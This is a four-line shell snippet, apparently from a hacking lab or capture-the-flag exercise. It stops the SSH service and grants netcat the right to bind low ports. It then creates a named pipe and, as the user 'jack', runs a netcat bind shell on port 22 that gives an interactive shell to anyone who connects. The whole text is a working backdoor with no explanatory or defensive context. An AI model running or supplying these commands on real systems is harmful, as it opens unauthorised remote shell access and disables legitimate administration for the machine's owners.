service ssh stop
setcap CAP_NET_BIND_SERVICE=+eip /bin/nc
rm -f /tmp/f; mkfifo /tmp/f
su - jack -c "cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 22 > /tmp/f"